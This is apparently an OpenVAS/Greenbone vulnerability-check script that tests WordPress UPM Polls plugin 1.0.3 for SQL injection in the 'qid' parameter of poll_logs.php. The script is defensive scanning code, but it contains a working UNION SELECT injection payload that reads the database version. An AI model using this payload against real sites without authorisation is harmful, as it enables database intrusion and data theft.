###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_upm_polls_plugin_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# WordPress UPM Polls Plugin 'qid' Parameter SQL Injection Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause SQL Injection attack
  and gain sensitive information.
  Impact Level: Application";
tag_affected = "WordPress UPM Polls Plugin version 1.0.3 and prior.";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed via
  the 'qid' parameter to '/wp-content/plugins/upm-polls/includes/poll_logs.php'
  allows attacker to manipulate SQL queries by injecting arbitrary SQL code.";
tag_solution = "Upgrade to UPM Polls Wordpress plugin version 1.0.4 or later
  For updates refer to http://wordpress.org/extend/plugins/upm-polls/";
tag_summary = "This host is running WordPress UPM Polls Plugin and is prone to
  SQL injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802032";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-08-18 14:57:45 +0200 (Thu, 18 Aug 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("WordPress UPM Polls Plugin 'qid' Parameter SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/74377");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/45535");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17627");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103755");

  script_description(desc);
  script_summary("Check if WordPress UPM Polls plugin is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct SQL Injection
path = dir + "/wp-content/plugins/upm-polls/includes/poll_logs.php?qid=" +
       "-1%20UNION%20ALL%20SELECT%20NULL,CONCAT(0x6F70656E7661732D73716" +
       "C2D74657374,0x3a,@@version,0x3a,0x6F70656E7661732D73716C2D74657" +
       "374),NULL,NULL,NULL,NULL--%20";

## Construct attack GET request and Send
req = string("GET ", path, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: Wordpress UPM Pools SQL Test\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Referer: http://", host, path, "\r\n", "\r\n");
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

## Check Exploit worked or not in the response
if(res =~ "openvas-sql-test:[0-9]+.*:openvas-sql-test")
{
  security_hole(port);
  exit(0);
}